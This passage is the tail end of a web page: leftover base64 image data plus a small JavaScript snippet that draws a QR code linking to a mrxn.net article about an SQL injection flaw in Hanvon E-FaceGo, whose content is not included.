v21/aE1Kmd8fpE/eKKh6yjr/B+QuoU3ii2Dxch04IR3atThug9h/D6RRh569TFzkPqrvLVB1JT1xW9trh9QPwwonUQ3hp5cxHmPv0w6taJ+grvJ8RTeRM8vIes9gWZck2xYuUrrUK9rvchL0L6QnDvrWt9V7D8FZBeECyuApJf6fXMA9f6wOiDMa89VezXup+Q/Wm8wfX2HlKTmkXfI4xT7rq5vSB+CH586Bix+0f1kV3x6RGt7rm82PWe6xPh+WvSd9ZHX+H9hNQpvFFs7yGQaUPQPcKYr6a94u0jwrV+3Q+pg+BsPYjWa1e5/KyXWmHXzTuWtwKyD/XiKnoO8cED7yekTuqN4jCQPsW+V8g0z3iIz36idRB9lcv3OvkruKqF+doQHoKuAWMuL8JzXd8VPAzkStHt+XsncPguy6UgU+93Wc/1i5C6VS7f0b7iSu/8LIfsAUbU6xqivCgPqZcXITwEr/qt1z/D+wnxlN4EDwOBTH21P3iuO3XrzWGsW/Ew+iA5BHsdhAdcckO9HYHP/xfR2HV5Ud18hfpEGNeBMZ/1OQxkZrq5nzuB7eeQ1ZIwTtXp6+85jH4Yc/0Q3tx+HVe6vDhDe0HWMu8Iow7zHEbeNe0H0SGo3hGiwxHvJ8TTfBM8DMRprvYH41S772r9yicPWcf+8uYzhLEGklsLYz7rUZx+sbhnAfO+EN5aGHP5PR4Gshfv658/gcsD8W4R3Spk6vKQXF1UF+U7wlgPyWGOvX6fuxakdq/NrmH0wZjbz1qI3nl1eYhPXlTf4+WB2OTGv3sC20BgnOJ+anUN0SFY3D7cptwql4f06bn1orq44ktfaZ2HrA3Bqv03w/Ug/c1do+fyhdtAKrnj9SdwGAhkqhB0i05VhFGHMT/zdd3c9TqudMi6QC/5/GkcHnzvYd7x0OiLAD57fqXbLyqA8DCifSG8ufUiRAfuXxP78WZf26e9fV9n01SHTNd6SA7B7uu5dSKkDoLdD+H17xGiQdDavaeuOw/xl1YB5pUdo9cfHWHgeR+Ibr/Cwz9ZaXX//aoT2D7LqunsY7UhPWe6PhjvAuvUzWH0dX2Vy++x94T0XvHWwujTry7Kw+hX73jmVy+8n5A6hTeK7T0EMm24hv01eFfIQ/r0HEZevdfLw9zfdUDqgKveK94G6sDw3VXXzUWY+6/o9xPiKb0JbgPxbjjD1b5hflf0ftZD/OryIkQ3X6H1hd1TXAWkFwT1wZiXdx8w6pAcRrSfaA9zsfMw9gHun0M+3uxre0LcFxynBigv0ekDw7+3kByC+kQIDyMuF/oSYPTDI/+yfO4DMN1+spboe5AHPmvV5c07qkPqYMSum4v7foeBaLrxNSfwxwNxupC7wpch31EdRr+8fvMz1F+ot64rVrk8PN8DRK9eFb0O5np5K/TXdYV5Xe8D0ge430M+3uzrj5+Qq68HHncBPH5Fq/XeMRCfuQjhu9+8UG9dV/Qc0qPz5hC9aitWfGn7gNTp32uza4hfzbrCHxuIi9/4/AQOA6kpzeJ5m6MK412gw94w1/VBdAjKP6uHeCFoDczz3qvnMK+zr37z7yKM/av+MJAi73jdCWwDgUwLnuN3twrpt7qb5OGaz/WtM58hjD2tEWc1zzjrRL3mkPVWvD51EVIH3N9lfbzZ1/aEvNm+/rPb+R8AAAD//6ZuQYMAAAAGSURBVAMADT+MsDdoddUAAAAASUVORK5CYII=)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/hanvon-efacego-getValidPersonForFirst-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 